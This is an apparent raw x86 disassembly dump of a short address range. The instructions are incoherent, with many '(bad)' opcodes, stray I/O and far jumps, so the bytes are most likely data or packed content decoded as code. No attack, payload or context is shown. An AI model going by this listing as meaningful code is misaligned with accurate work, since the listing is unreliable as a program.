  411530:	mov    eax,ds:0xa44eb9f7
  411535:	stos   DWORD PTR es:[edi],eax
  411536:	das    
  411537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411538:	sbb    bh,0xa5
  41153b:	fst    QWORD PTR [eax+0x54fc8136]
  411541:	add    ebp,DWORD PTR [ecx]
  411543:	cwde   
  411544:	sbb    BYTE PTR [edi-0x32992ce3],cl
  41154a:	outs   dx,BYTE PTR ds:[esi]
  41154b:	pop    ecx
  41154c:	shl    BYTE PTR [edi+0xde4e758],1
  411552:	push   cs
  411553:	cdq    
  411554:	xchg   edi,eax
  411555:	and    bl,0xd5
  411558:	sub    ebp,0x2c
  41155b:	test   BYTE PTR [eax+edi*4],bh
  41155e:	pop    edi
  41155f:	int    0xc6
  411561:	(bad)  
  411562:	in     al,0x8b
  411564:	xor    BYTE PTR [esp+ecx*2-0x1c],dh
  411568:	aam    0x6d
  41156a:	mov    cl,al
  41156c:	add    ch,BYTE PTR [ecx-0x27f0cc73]
  411572:	out    dx,eax
  411573:	scas   eax,DWORD PTR es:[edi]
  411574:	paddd  mm7,QWORD PTR [edi]
  411577:	test   ebp,esi
  411579:	lea    eax,[eax-0x17]
  41157c:	mov    esp,0x5fb9afd9
  411581:	sub    BYTE PTR [esi-0x67db7a04],dl
  411587:	ja     0x41155d
  411589:	enter  0xae95,0xd4
  41158d:	sbb    eax,0x369e2c87
  411592:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411594:	xchg   edi,eax
  411595:	shl    bh,0x83
  411598:	lods   eax,DWORD PTR ds:[esi]
  411599:	mov    dl,0x6a
  41159b:	hlt    
  41159c:	push   ss
  41159d:	xchg   ebp,eax
  41159e:	stos   DWORD PTR es:[edi],eax
  41159f:	loopne 0x41158d
  4115a1:	sahf   
  4115a2:	cmp    ecx,edi
  4115a4:	stc    
  4115a5:	xor    eax,0x221a490c
  4115aa:	xchg   cl,cl
  4115ac:	repnz dec edi
  4115ae:	frstor [ebx-0x4bdcc9a7]
  4115b4:	lods   al,BYTE PTR ds:[esi]
  4115b5:	xchg   BYTE PTR [ebp-0x40],dh
  4115b8:	jl     0x41161a
  4115ba:	dec    edx
  4115bb:	pop    esi
  4115bc:	popf   
  4115bd:	pop    ebp
  4115be:	out    0x6e,al
  4115c0:	dec    ebx
  4115c1:	ss jmp 0xf55e:0x9b453f96
  4115c9:	sub    esp,DWORD PTR ss:[edi-0x714184a6]
  4115d0:	mov    al,0x36
  4115d2:	jne    0x41160c
  4115d4:	adc    dh,BYTE PTR [esi-0x27]
  4115d7:	xchg   edx,eax
  4115d8:	jecxz  0x41159e
  4115da:	leave  
  4115db:	mov    edi,0xc17548d8
  4115e0:	les    ebp,FWORD PTR [eax]
  4115e2:	fs addr16 jno 0x411628
  4115e6:	bound  esi,QWORD PTR [esi-0x29f9f690]
  4115ec:	mov    ah,0x81
  4115ee:	addr16 stc 
  4115f0:	jecxz  0x411641
  4115f2:	mov    ecx,0x663b8456
  4115f7:	inc    ebx
  4115f8:	cmp    al,0xec
  4115fa:	test   DWORD PTR [edx+0x4c],ebp
  4115fd:	xchg   edi,eax
  4115fe:	mov    ds:0x1f76cb12,al
  411603:	adc    DWORD PTR [ecx+0x7c],ebx
  411606:	jbe    0x41165d
  411608:	xor    eax,0xdc546881
  41160d:	push   ds
  41160e:	mov    dh,0x48
  411610:	cmc    
  411611:	leave  
  411612:	shl    ch,0x0
  411615:	mov    ch,0x78
  411617:	outs   dx,BYTE PTR ds:[esi]
  411618:	ins    BYTE PTR es:[edi],dx
  411619:	cwde   
  41161a:	sub    ebx,ecx
  41161c:	icebp  
  41161d:	jl     0x411662
  41161f:	adc    dl,ch
  411621:	inc    edx
  411622:	xor    DWORD PTR [ebx-0x5e],eax
  411625:	mov    edx,0x2751646b
  41162a:	nop
  41162b:	pop    DWORD PTR [edx+0x6cf08dd6]
  411631:	lock xchg ecx,eax
  411633:	and    eax,0x24672e20
  411638:	cmp    cl,BYTE PTR [ecx+ecx*1+0x12]
  41163c:	(bad)  
  41163d:	repz jbe 0x4115df
  411640:	fnstsw WORD PTR [ecx]
  411642:	jmp    0x6385:0xf894
  411648:	and    eax,0x545a32b7
  41164d:	dec    edi
  41164e:	sub    eax,0x3c9aaf73
  411653:	sub    DWORD PTR [ebx-0x12],ebx
  411656:	adc    cl,BYTE PTR [edx-0x29]
  411659:	outs   dx,DWORD PTR ds:[esi]
  41165a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41165b:	cmp    ah,0xdc
  41165e:	jg     0x4115f7
  411660:	jmp    0x36c5:0x16b0f4f2
  411667:	lds    ebx,FWORD PTR [edx-0x5e]
  41166a:	into   
  41166b:	jecxz  0x41161f
  41166d:	pop    ebp
  41166e:	push   cs
  41166f:	dec    ebx
  411670:	scas   al,BYTE PTR es:[edi]
  411671:	aam    0xcc
  411673:	aaa    
  411674:	pop    ss
  411675:	nop
  411676:	mov    DWORD PTR [edi-0x7086d042],0x7a599f
  411680:	mov    edx,ecx
  411682:	add    DWORD PTR [eax],0xffffffa4
  411685:	mov    WORD PTR [ecx-0x47],ds
  411688:	test   al,0x63
  41168a:	dec    esp
  41168b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168c:	push   edx
  41168d:	and    dl,al
  41168f:	mov    al,0xe8
  411691:	cli    
  411692:	fisttp QWORD PTR [edi-0x42]
  411695:	test   ecx,esi
  411697:	out    dx,eax
  411698:	bound  edx,QWORD PTR [eax]
  41169a:	in     eax,dx
  41169b:	push   edx
  41169c:	enter  0xf3b2,0xcd
  4116a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a1:	sbb    ebx,DWORD PTR [esi+eax*2+0x64d74a22]
  4116a8:	hlt    
  4116a9:	aaa    
  4116aa:	in     eax,0x7e
  4116ac:	cld    
  4116ad:	not    BYTE PTR [ebp-0x44]
  4116b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b1:	(bad)  
  4116b2:	fwait
  4116b3:	and    dl,BYTE PTR [esi]
  4116b5:	mov    dh,BYTE PTR [ecx+ecx*4+0x7d46aa7a]
  4116bc:	iret   
  4116bd:	pop    ebx
  4116be:	cmp    al,0xf1
  4116c0:	jmp    0xb422:0x17b02896
  4116c7:	std    
  4116c8:	xor    dh,bh
  4116ca:	idiv   BYTE PTR [esi+0x48]
  4116cd:	pop    edi
  4116ce:	enter  0x1321,0xac
  4116d2:	retf   
  4116d3:	loope  0x411669
  4116d5:	push   esp
  4116d6:	or     eax,0x9d0cee46
  4116db:	mov    cs,WORD PTR [esi+0x18]
  4116de:	gs es pop eax
  4116e1:	jecxz  0x411688
  4116e3:	loop   0x411706
  4116e5:	call   0xd865:0x41ae668a
  4116ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ed:	dec    ebx
  4116ee:	sti    
  4116ef:	popa   
  4116f0:	icebp  
  4116f1:	fld    TBYTE PTR [eax+0x24]
  4116f4:	icebp  
  4116f5:	jp     0x4116e6
  4116f7:	stos   BYTE PTR es:[edi],al
  4116f8:	les    ecx,FWORD PTR ds:0x11d54423
  4116fe:	push   esp
  4116ff:	inc    ebx
  411700:	mov    DWORD PTR [ebp+0x52e1f89d],ebx
  411706:	jno    0x411759
  411708:	xlat   BYTE PTR ds:[ebx]
  411709:	leave  
  41170a:	ins    BYTE PTR es:[di],dx
  41170c:	test   DWORD PTR [edx-0x75],ebx
  41170f:	xchg   DWORD PTR [edx-0x1d],edx
  411712:	push   cs
  411713:	popf   
  411714:	jg     0x411778
  411716:	xor    eax,0xbe64600d
  41171b:	test   bh,bl
  41171d:	push   esi
  41171e:	mov    ebx,DWORD PTR [ecx-0x10]
  411721:	test   BYTE PTR [eax-0x11],dh
  411724:	adc    DWORD PTR [esi+ebx*1],0xc34f19b6
  41172b:	xchg   DWORD PTR [edx],ecx
  41172d:	cmp    eax,0x80718e55
  411732:	pop    eax
  411733:	fwait
  411734:	xor    ch,ah
  411736:	mov    ebx,0xac59065f
  41173b:	push   ebp
  41173c:	aaa    
  41173d:	push   ss
  41173e:	lock mov dh,0x66
  411741:	icebp  
  411742:	std    
  411743:	inc    edx
  411744:	adc    edi,DWORD PTR [ecx-0x43]
  411747:	mov    DWORD PTR [edx+edi*4+0x1f],ecx
  41174b:	ficom  DWORD PTR [ebx]
  41174d:	jbe    0x41179b
  41174f:	add    BYTE PTR [eax],cl
  411751:	add    bl,BYTE PTR [edx]
  411753:	sub    DWORD PTR [edi+0x4d6d53c0],ebp
  411759:	jp     0x411742
  41175b:	or     eax,0xf0635212
  411760:	aam    0x45
  411762:	ret    0x1f57
  411765:	mov    ecx,0xe215ff86
  41176a:	pop    ebp
  41176b:	xchg   ebp,eax
  41176c:	ja     0x411769
  41176e:	(bad)  
  41176f:	xchg   edi,eax
  411770:	adc    DWORD PTR cs:[edx],ecx
  411773:	or     esi,DWORD PTR [eax]
  411775:	test   al,0xb7
  411777:	fistp  QWORD PTR [ebx-0x57]
  41177a:	clc    
  41177b:	jnp    0x411706
  41177d:	jo     0x411740
  41177f:	repz dec esi
  411781:	int3   
  411782:	xchg   DWORD PTR [edi-0x3c],ebp
  411785:	mov    edi,0x2905e91d
  41178a:	test   DWORD PTR ds:0x25880a6e,ecx
  411790:	mov    ch,0xc9
  411792:	mov    edi,0x17823f41
  411797:	sub    eax,0x3e5394f4
  41179c:	aad    0xcd
  41179e:	xchg   ebp,eax
  41179f:	mov    al,0x2f
  4117a1:	rol    BYTE PTR [ebx+0x3268a9ee],cl
  4117a7:	fwait
  4117a8:	jno    0x4117e9
  4117aa:	mov    cl,0x6c
  4117ac:	and    dh,bh
  4117ae:	push   eax
  4117af:	loope  0x4117b9
  4117b1:	daa    
  4117b2:	pop    edx
  4117b3:	aaa    
  4117b4:	dec    ebx
  4117b5:	in     eax,dx
  4117b6:	mov    dl,0x5
  4117b8:	pushf  
  4117b9:	xchg   esp,eax
  4117ba:	mov    esp,0xb79f35ad
  4117bf:	inc    BYTE PTR ss:[ebx-0x2141a9fe]
  4117c6:	retf   
  4117c7:	mov    ah,0xec
  4117c9:	retf   0xb635
  4117cc:	loop   0x41181b
  4117ce:	ss mov edi,0xc5a64fd3
  4117d4:	ret    
  4117d5:	nop
  4117d6:	sub    dl,ch
  4117d8:	inc    esp
  4117d9:	aaa    
  4117da:	or     edi,ebp
  4117dc:	mov    dl,BYTE PTR [edi]
  4117de:	retf   
  4117df:	arpl   WORD PTR [esi+0x628ebf1f],sp
  4117e5:	in     eax,dx
  4117e6:	mov    ebx,DWORD PTR [ecx-0x2d58cff7]
  4117ec:	fnstenv [eax-0x42]
  4117ef:	ins    DWORD PTR es:[edi],dx
  4117f0:	icebp  
  4117f1:	jmp    0x8ba5:0xd9b6ee4f
  4117f8:	ret    0xc048
  4117fb:	mov    BYTE PTR [edx+0x6a],bl
  4117fe:	rcr    DWORD PTR [ecx-0x61],cl
  411801:	jbe    0x4117fb
  411803:	(bad)  
  411804:	mov    ah,0xee
  411806:	jae    0x4117f3
  411808:	and    eax,0xc64d282b
  41180d:	pop    esi
  41180e:	or     eax,0x20f52cde
  411813:	xlat   BYTE PTR ds:[ebx]
  411814:	inc    eax
  411815:	fiadd  DWORD PTR [ebx-0x5d]
  411818:	fdivr  QWORD PTR [eax-0x2e41fc9f]
  41181e:	sub    esi,eax
  411820:	adc    DWORD PTR [ecx+0x666fb610],esi
  411826:	fidivr WORD PTR [edx-0x465303a1]
  41182c:	(bad)  
  41182d:	mov    cl,BYTE PTR [ecx]
  41182f:	or     al,0x87
  411831:	xor    ecx,DWORD PTR ds:0x90b1cf94
  411837:	pop    si
  411839:	jg     0x41183a
  41183b:	aad    0x58
  41183d:	cmp    bh,ch
  41183f:	add    DWORD PTR [eax+0x10216ce1],ebx
  411845:	in     eax,0x82
  411847:	mov    dh,0xa0
  411849:	mov    ds:0xd0e57534,al
  41184e:	pusha  
  41184f:	mov    ecx,0xdd87f3e4
  411854:	jo     0x411896
  411856:	and    ecx,ebx
  411858:	mov    dl,0x6e
  41185a:	cmp    eax,0x80d43899
  41185f:	pop    edx
  411860:	loopne 0x4118cf
  411862:	xchg   edx,eax
  411863:	(bad)  
  411864:	mov    eax,0x74614a4c
  411869:	outs   dx,DWORD PTR ds:[esi]
  41186a:	fidivr DWORD PTR [edi]
  41186c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41186d:	inc    eax
  41186e:	or     al,0xf7
  411870:	fldcw  WORD PTR [ebx]
  411872:	pop    ss
  411873:	aas    
  411874:	mov    ah,0xf2
  411876:	ins    BYTE PTR es:[edi],dx
  411877:	cs test al,0x7f
  41187a:	and    ecx,DWORD PTR [esi-0x40e55554]
  411880:	hlt    
  411881:	fwait
  411882:	leave  
  411883:	loopne 0x411834
  411885:	cmp    ch,BYTE PTR [esi]
  411887:	imul   esp,DWORD PTR [eax],0x56
  41188a:	sbb    bh,BYTE PTR [ecx+0x4ad37399]
  411890:	inc    ecx
  411891:	repz mov ebp,0xff9801a4
  411897:	sar    DWORD PTR [ebx+0x1d],cl
  41189a:	std    
  41189b:	and    BYTE PTR [edi+0x46],0x2c
  41189f:	xlat   BYTE PTR ds:[ebx]
  4118a0:	mov    edx,0xeb352e72
  4118a5:	mov    edi,edx
  4118a7:	inc    ebp
  4118a8:	push   ss
  4118a9:	cmp    eax,0x4e2dc9e6
  4118ae:	push   edi
  4118af:	lods   al,BYTE PTR ds:[esi]
  4118b0:	xor    eax,0x38c9b0e7
  4118b5:	sbb    edi,DWORD PTR [edx+0x29]
  4118b8:	out    dx,eax
  4118b9:	pusha  
  4118ba:	inc    ebp
  4118bb:	ins    DWORD PTR es:[edi],dx
  4118bc:	test   DWORD PTR [eax+0x5bbb6165],eax
  4118c2:	mov    ds:0x842a1b40,eax
  4118c7:	fcos   
  4118c9:	pop    edi
  4118ca:	popf   
  4118cb:	dec    ebx
  4118cc:	pop    ebp
  4118cd:	je     0x41185e
  4118cf:	or     DWORD PTR [ecx-0x64a3684c],esp
  4118d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d6:	imul   ecx,DWORD PTR [esi+esi*4-0x771cd59b],0x62174d60
  4118e1:	push   ebp
  4118e2:	inc    eax
  4118e3:	inc    eax
  4118e4:	xchg   esp,eax
  4118e5:	adc    al,0x40
  4118e7:	imul   edi,DWORD PTR [ecx-0x6ad076c1],0x16
  4118ee:	pop    edx
  4118ef:	push   ds
  4118f0:	inc    eax
  4118f1:	adc    DWORD PTR [ebp-0x50d93b21],esp
  4118f7:	stos   DWORD PTR es:[edi],eax
  4118f8:	xlat   BYTE PTR ds:[ebx]
  4118f9:	pop    esi
  4118fa:	xchg   DWORD PTR [esi+0x59],ecx
  4118fd:	push   ecx
  4118fe:	(bad)  
  411900:	jecxz  0x4118f9
  411902:	inc    esp
  411903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411904:	out    0x4d,al
  411906:	jnp    0x41190f
  411908:	sub    BYTE PTR [edi],ch
  41190a:	sub    edx,DWORD PTR [edx]
  41190c:	fidiv  WORD PTR [ebp+0x7c]
  41190f:	sbb    DWORD PTR [edx+0x4826ee99],edi
  411915:	je     0x4118c3
  411917:	(bad)  
  411918:	pop    esi
  411919:	les    ebx,FWORD PTR [ecx-0x5098ae85]
  41191f:	and    esi,edi
  411921:	shl    DWORD PTR [esi],cl
  411923:	call   0xa079:0x7e5a4364
  41192a:	xchg   DWORD PTR [edi-0x59],edx
  41192d:	sub    bh,BYTE PTR [edx+0x48894bcf]
  411933:	add    ebp,DWORD PTR [edx-0x76df034e]
  411939:	push   eax
  41193a:	mov    ah,0xc9
  41193c:	scas   eax,DWORD PTR es:[edi]
  41193d:	stc    
  41193e:	jae    0x41193d
  411940:	xchg   DWORD PTR [edx+0x3b],edi
  411943:	mov    ch,0x86
  411945:	pusha  
  411946:	add    al,0xe9
  411948:	xor    BYTE PTR [ecx+eiz*1],cl
  41194b:	fimul  DWORD PTR [edi+0x4d]
  41194e:	inc    esp
  41194f:	sbb    ah,BYTE PTR [eax+ebx*1]
  411952:	call   DWORD PTR [eax]
  411954:	xchg   esp,eax
  411955:	mov    esi,0x9c8282f4
  41195a:	xchg   ecx,eax
  41195b:	jae    0x41191c
  41195d:	jmp    0xbbb4bab4
  411962:	rcr    DWORD PTR [edi-0x4b702efe],cl
  411968:	popf   
  411969:	ins    DWORD PTR es:[edi],dx
  41196a:	and    eax,0x607f3671
  41196f:	outs   dx,BYTE PTR ds:[esi]
  411970:	aaa    
  411971:	add    BYTE PTR [edx+eax*4+0x14],0x2
  411976:	jnp    0x411967
  411978:	mov    esi,0xbba37d29
  41197d:	xchg   esi,eax
  41197e:	iret   
  41197f:	ja     0x4119c6
  411981:	popa   
  411982:	and    DWORD PTR [ecx],edi
  411984:	sahf   
  411985:	xchg   esp,eax
  411986:	mov    dh,0x5f
  411988:	jnp    0x4119d3
  41198a:	cmp    bh,BYTE PTR [ebx+0x49]
  41198d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41198e:	mov    dl,0x54
  411990:	shr    bh,0x58
  411993:	mov    edx,0xd521ab60
  411998:	xor    dh,BYTE PTR [edx-0x7632edae]
  41199e:	jne    0x4119bc
  4119a0:	sbb    bl,BYTE PTR [esi-0x6faa9b61]
  4119a6:	adc    al,0x58
  4119a8:	adc    BYTE PTR [eax+0x5c557d62],bl
  4119ae:	push   esp
  4119af:	mov    ch,0x45
  4119b1:	jnp    0x411965
  4119b3:	xor    eax,0xb25bdb52
  4119b8:	ret    0x3fdf
  4119bb:	ins    DWORD PTR es:[edi],dx
  4119bc:	pop    esi
  4119bd:	push   0xffffffe6
  4119bf:	xor    ecx,edi
  4119c1:	xchg   bh,ch
  4119c3:	rol    BYTE PTR [edi+edi*2-0x23],cl
  4119c7:	xchg   DWORD PTR [edx+0x68],esi
  4119ca:	and    DWORD PTR ds:0xc491cda,esi
  4119d0:	sub    bh,BYTE PTR [eax]
  4119d2:	cmp    ah,BYTE PTR [ecx+ecx*2-0x6]
  4119d6:	(bad)  
  4119d7:	stc    
  4119d8:	loop   0x411a3d
  4119da:	ror    BYTE PTR [edi],1
  4119dc:	jp     0x41199a
  4119de:	xor    eax,0xe4e570de
  4119e3:	mov    ebx,0x61b6b980
  4119e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119e9:	mov    ds:0xf0755798,eax
  4119ee:	or     BYTE PTR [ecx],0x55
  4119f1:	in     eax,0x3b
  4119f3:	fisttp WORD PTR [edx]
  4119f5:	fiadd  DWORD PTR [ebp+0x25d6eea2]
  4119fb:	push   ds
  4119fc:	mov    ebp,0x94624fa6
  411a01:	push   cs
  411a02:	cdq    
  411a03:	fst    QWORD PTR [esi]
  411a05:	cmp    DWORD PTR [ecx+0x3e],ebp
  411a08:	mov    edi,DWORD PTR [edi+0x2b]
  411a0b:	or     DWORD PTR [edi],edx
  411a0d:	xor    esi,0x997dabfc
  411a13:	mov    ds:0x366693e3,eax
  411a19:	add    al,0x75
  411a1b:	dec    esp
  411a1c:	and    al,0xc5
  411a1e:	add    BYTE PTR [ecx+0x2d68a91],bh
  411a24:	jp     0x4119d0
  411a26:	neg    DWORD PTR [eax+0x17]
  411a29:	sbb    BYTE PTR [edi],dl
  411a2b:	ds sub eax,0x844ccb9c
  411a31:	xchg   esp,eax
  411a32:	sbb    BYTE PTR [ebx-0x3b],ah
  411a35:	mov    ecx,0x477b5039
  411a3a:	fwait
  411a3b:	and    eax,0xa32fee9e
  411a40:	mov    edx,0xc1716968
  411a45:	aas    
  411a46:	mov    WORD PTR [eax+0x5bbdfdae],ds
  411a4c:	jne    0x411a4a
  411a4e:	add    eax,0x46399116
  411a53:	jle    0x411abc
  411a55:	loope  0x411aa3
  411a57:	sub    DWORD PTR [eax],esp
  411a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a5a:	sahf   
  411a5b:	(bad)  
  411a5c:	scas   al,BYTE PTR es:[edi]
  411a5d:	jbe    0x411a97
  411a5f:	and    DWORD PTR [ebp-0x39a09833],edx
  411a65:	test   DWORD PTR [edx],eax
  411a67:	icebp  
  411a68:	test   eax,0x68d7eef5
  411a6d:	inc    esp
  411a6e:	inc    ebp
  411a6f:	xor    BYTE PTR [ebx-0x59],bl
  411a72:	imul   esi,ebx,0x58a7e254
  411a78:	pusha  
  411a79:	add    ah,BYTE PTR [esi+esi*8+0x4987ea4d]
  411a80:	mov    ds:0x7a9261b6,al
  411a85:	int    0x6
  411a87:	fiadd  WORD PTR [edx-0x14066880]
  411a8d:	jmp    0x411a85
  411a8f:	rcl    BYTE PTR [esi+0x2e11576e],cl
  411a95:	dec    esi
  411a96:	add    eax,0xb3c005a8
  411a9b:	enter  0xb1d8,0xfd
  411a9f:	out    0x97,al
  411aa1:	out    0x1a,al
  411aa3:	std    
  411aa4:	nop
  411aa5:	cmp    al,0x11
  411aa7:	xor    al,0xfe
  411aa9:	sbb    DWORD PTR [edx-0x4e],ebp
  411aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aad:	xor    bl,bl
  411aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab0:	xchg   esi,eax
  411ab1:	es cdq 
  411ab3:	and    BYTE PTR [edi+0x173715ec],cl
  411ab9:	outs   dx,DWORD PTR ds:[esi]
  411aba:	fldcw  WORD PTR [ebx]
  411abc:	adc    eax,0x3f3d6e1f
  411ac1:	imul   esi,DWORD PTR [edi+ebx*8-0x6caaa5b9],0xffffffee
  411ac9:	daa    
  411aca:	into   
  411acb:	add    al,0x8b
  411acd:	pop    edx
  411ace:	add    al,0x3e
  411ad0:	ror    BYTE PTR [edi-0x21],1
  411ad3:	aaa    
  411ad4:	add    al,0x16
  411ad6:	and    ch,ch
  411ad8:	mov    esi,0xff1dabe1
  411add:	rcl    BYTE PTR [edx-0x76],1
  411ae0:	sbb    DWORD PTR [esi-0x3d],edx
  411ae3:	and    esp,DWORD PTR [ebx]
  411ae5:	jecxz  0x411ab8
  411ae7:	arpl   WORD PTR [esp+ebp*2-0x58ed5a58],bp
  411aee:	inc    edx
  411aef:	mov    al,0xab
  411af1:	jecxz  0x411b70
  411af3:	xchg   ch,bl
  411af5:	inc    ebp
  411af6:	dec    ecx
  411af7:	gs xchg esp,eax
  411af9:	jle    0x411b20
  411afb:	out    0x4c,eax
  411afd:	xor    bh,BYTE PTR [edx]
  411aff:	sbb    edx,DWORD PTR [eax+eax*4]
  411b02:	mov    ebp,0x546c16c7
  411b07:	cwde   
  411b08:	sbb    BYTE PTR [edi-0x722361b9],dh
  411b0e:	and    DWORD PTR fs:[edi+eiz*8+0x27a97f0f],ebp
  411b16:	inc    esi
  411b17:	stos   DWORD PTR es:[edi],eax
  411b18:	mov    ebx,DWORD PTR [esi+0x4499e47f]
  411b1e:	das    
  411b1f:	cmp    DWORD PTR ds:[eax+0x7e9aeb9d],ebp
  411b26:	sbb    bl,bl
  411b28:	sub    al,bl
  411b2a:	fcom   QWORD PTR [ebx-0x60531cba]
  411b30:	sahf   
  411b31:	(bad)  [ecx]
  411b33:	dec    esi
  411b34:	(bad)  
  411b35:	ins    DWORD PTR es:[edi],dx
  411b36:	ins    DWORD PTR es:[edi],dx
  411b37:	inc    ecx
  411b38:	cmp    al,0xc8
  411b3a:	or     DWORD PTR [ebx+0x39a996d3],esi
  411b40:	inc    eax
  411b41:	xchg   edx,eax
  411b42:	(bad)  
  411b43:	into   
  411b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b45:	ror    DWORD PTR [ebx-0x6a],cl
  411b48:	push   ds
  411b49:	test   al,0x5b
  411b4b:	mov    ecx,0x50426110
  411b50:	push   es
  411b51:	cdq    
  411b52:	scas   eax,DWORD PTR es:[edi]
  411b53:	pop    es
  411b54:	outs   dx,DWORD PTR ds:[esi]
  411b55:	retf   0xcb01
  411b58:	mov    eax,0x95ebc6fd
  411b5d:	iret   
  411b5e:	rol    ebx,1
  411b60:	push   ss
  411b61:	in     al,dx
  411b62:	out    0x36,al
  411b64:	shr    BYTE PTR [edi-0x2b842861],1
  411b6a:	es jae 0x411b90
  411b6d:	fsubrp st(5),st
  411b6f:	ficomp DWORD PTR [ecx+0x748b33f6]
  411b75:	arpl   WORD PTR [ebp+0x7],bx
  411b78:	adc    cl,dh
  411b7a:	ror    BYTE PTR [esp+edi*8+0x7079ca7e],1
  411b81:	xchg   ebp,eax
  411b82:	fdivr  QWORD PTR [ebx]
  411b84:	neg    cl
  411b86:	jb     0x411b87
  411b88:	adc    al,0x31
  411b8a:	dec    esp
  411b8b:	(bad)  
  411b8d:	adc    BYTE PTR [ebp-0x25],0x3e
  411b91:	data16 add al,BYTE PTR [ecx]
  411b94:	retf   
  411b95:	push   esp
  411b96:	or     al,0xa3
  411b98:	or     ecx,ebx
  411b9a:	arpl   WORD PTR ds:0x8e5c5fba,si
  411ba0:	into   
  411ba1:	xor    cl,BYTE PTR [eax+0x50]
  411ba4:	xchg   BYTE PTR [edx-0x45],al
  411ba7:	jg     0x411b70
  411ba9:	je     0x411be2
  411bab:	and    dh,bh
  411bad:	and    ebx,edx
  411baf:	idiv   BYTE PTR [eax+0x5fcda412]
  411bb5:	pop    ecx
  411bb6:	pop    edx
  411bb7:	daa    
  411bb8:	mov    ah,0x66
  411bba:	fidivr DWORD PTR [ebp+0x29]
  411bbd:	mov    cl,0xb
  411bbf:	push   0xbdfad726
  411bc4:	ins    BYTE PTR es:[edi],dx
  411bc5:	mov    ?,WORD PTR [ecx]
  411bc7:	dec    ebx
  411bc8:	sub    eax,0x9f2c6fb3
  411bcd:	mov    ebx,0x8f7d4c8c
  411bd2:	je     0x411b6e
  411bd4:	cmp    DWORD PTR [ebx-0x60],edx
  411bd7:	dec    edx
  411bd8:	xor    al,0x9a
  411bda:	adc    bl,bl
  411bdc:	mov    ds,WORD PTR [eax+0x13]
  411bdf:	rcr    BYTE PTR [edx-0x42e1cb49],0xa0
  411be6:	je     0x411b9b
  411be8:	lock div bh
  411beb:	pop    edi
  411bec:	or     edi,edi
  411bee:	or     al,0x59
  411bf0:	push   edx
  411bf1:	inc    edi
  411bf2:	xor    BYTE PTR [ebx+0x6a7fa9b1],dl
  411bf8:	neg    DWORD PTR [esi-0x3df78bef]
  411bfe:	xlat   BYTE PTR ds:[ebx]
  411bff:	je     0x411c48
  411c01:	pop    eax
  411c02:	in     eax,0x29
  411c04:	mov    BYTE PTR [edx],dh
  411c06:	jns    0x411c5d
  411c08:	xor    BYTE PTR [ebx+0x18],0x6c
  411c0c:	adc    cl,ch
  411c0e:	mov    ebp,0x7d562f11
  411c13:	xchg   edx,eax
  411c14:	or     eax,0x6ea1a19e
  411c19:	(bad)  
  411c1a:	cmc    
  411c1b:	dec    esp
  411c1c:	sbb    BYTE PTR [ecx-0x1ffd64b],0x74
  411c23:	xor    al,0xed
  411c25:	in     eax,dx
  411c26:	mov    bh,0xbf
  411c28:	jl     0x411bd1
  411c2a:	fstp   TBYTE PTR ds:0x43a80060
  411c30:	mov    BYTE PTR [edi-0x575fdf32],dl
  411c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c37:	mov    ds:0xc8574f94,eax
  411c3c:	or     BYTE PTR [edx],bl
  411c3e:	inc    edi
  411c3f:	fild   DWORD PTR es:[edi]
  411c42:	loope  0x411c9d
  411c44:	or     BYTE PTR [edx+0x54],al
  411c47:	xchg   esp,eax
  411c48:	cmp    DWORD PTR [ebx-0x4b5c93fa],esp
  411c4e:	scas   eax,DWORD PTR es:[edi]
  411c4f:	js     0x411c33
  411c51:	hlt    
  411c52:	jnp    0x411c44
  411c54:	mov    al,ds:0x246b4525
  411c59:	in     al,dx
  411c5a:	pop    edx
  411c5b:	dec    ecx
  411c5c:	imul   ebp,DWORD PTR [esi-0x29d81ec4],0x2a2646eb
  411c66:	(bad)  
  411c68:	pop    esp
  411c69:	jecxz  0x411ce8
  411c6b:	add    DWORD PTR [edi-0x16],ecx
  411c6e:	dec    esi
  411c6f:	sbb    ebx,edi
  411c71:	mov    ds:0x49412115,eax
  411c76:	xor    ch,dl
  411c78:	sbb    al,0x8d
  411c7a:	sbb    bl,ah
  411c7c:	call   0xa9426517
  411c81:	jmp    0x411c4f
  411c83:	js     0x411c60
  411c85:	and    eax,0x29fd51ee
  411c8a:	jbe    0x411cb9
  411c8c:	jl     0x411c60
  411c8e:	sbb    BYTE PTR [eax],al
  411c90:	fiadd  WORD PTR [ebx]
  411c92:	add    ebp,DWORD PTR [ecx]
  411c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c95:	clc    
  411c96:	or     BYTE PTR [edx],ah
  411c98:	cmp    eax,DWORD PTR [ebx]
  411c9a:	cmp    dl,BYTE PTR [esi-0x19]
  411c9d:	xchg   edi,eax
  411c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c9f:	dec    esp
  411ca0:	jbe    0x411c3f
  411ca2:	rcr    ebp,0x7
  411ca5:	sub    al,0xcb
  411ca7:	pusha  
  411ca8:	shl    BYTE PTR [ecx+0xd],1
  411cab:	lea    ebp,[edi-0x31]
  411cae:	xchg   esp,eax
  411caf:	sub    al,0x73
  411cb1:	mov    ds:0x37e5d8a8,al
  411cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cb7:	loope  0x411d0c
  411cb9:	mov    ds:0x5b04ff8e,eax
  411cbe:	xchg   BYTE PTR [edx+esi*2+0x140350a4],bl
  411cc5:	inc    esi
  411cc6:	and    eax,0x28cc7bd5
  411ccb:	or     ebp,DWORD PTR [eax+0x32]
